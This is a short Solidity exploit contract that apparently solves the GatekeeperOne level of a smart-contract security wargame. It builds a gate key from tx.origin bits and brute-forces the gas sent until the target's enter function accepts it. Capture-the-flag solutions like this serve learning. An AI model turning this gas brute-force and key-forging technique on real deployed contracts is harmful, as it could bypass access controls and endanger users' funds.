// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./GatekeeperOne.sol";

function playerScript(address instanceAddress) {
    new GatekeeperOneExploit().exploit(instanceAddress);
}

contract GatekeeperOneExploit {
    function exploit(address instanceAddress) public {
        uint64 gateKeyUint = 0;
        gateKeyUint ^= uint16(uint160(tx.origin));
        gateKeyUint += 1 << 32;
        bytes8 gateKey = bytes8(gateKeyUint);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success,) = instanceAddress.call{gas: i + 8191 * 4}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
